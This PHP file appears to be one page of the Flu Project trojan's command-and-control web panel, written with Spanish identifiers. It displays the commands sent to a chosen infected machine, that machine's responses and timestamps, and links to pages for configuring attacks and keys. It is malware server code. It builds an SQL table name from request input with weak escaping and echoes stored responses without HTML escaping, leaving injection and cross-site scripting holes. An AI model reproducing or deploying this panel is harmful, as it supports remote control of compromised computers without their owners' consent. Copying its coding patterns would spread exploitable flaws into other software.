<?php
session_start();
if(empty($_SESSION['conectado']))
{
   header ("Location: index.php");
   exit;
}
function filtrar($variable)
{
	return addcslashes(mysql_real_escape_string($variable),',<>');
}
?>
<html>
<head>
<style type="text/css">
body {
  background-image: url("images/fondo.png");
  background-color: #000000;
  background-repeat: repeat-x;
}
</style>
</head>
<body >
<br/><div align="center"></a><a href="http://www.flu-project.com"><img src="images/banner-servidor-web-flu.png" border="none"/></a></div><br/>
<div align="center" width="100%"><a href="menuPrincipal.php"><img src="images/boton-menu-principal.png" border="none"/></a>
<a href="configurar-ataque.php"><img src="images/boton-configurar-ataque.png" border="none"/></a>
<a href="configurar-claves.php"><img src="images/claves1.png" border="none"/></a>
<a href="gestionar-usuarios.php"><img src="images/user1.png" border="none"/></a>
<a href="logout.php"><img src="images/logout.png" border="none"/></a>
</div>
<div style="color: #FFFFFF">
<?php
error_reporting(0);
//Datos de conexión a la BBBDD
include "conexion-bbdd.php";

$result_a = mysql_query("SELECT comando,respuesta,fecha FROM t_".str_replace(array("."),array("_"),filtrar($_GET['maquina']))." WHERE fecha='".filtrar($_GET['fecha'])."'");
//Se muestra la respuesta al comando enviado, con la fecha en la que recibió la respuesta
if ($row_a = mysql_fetch_array($result_a)){
	echo '<table><tbody>';
	do {
		echo $row_a["comando"].' ';
		echo $row_a["respuesta"].' ';
		echo $row_a["fecha"].'<br/>';
	} while ($row_a = mysql_fetch_array($result_a));
	echo '</tbody></table>';
}
include "cerrar-conexion-bbdd.php";
?>
</div>
</body>
</html>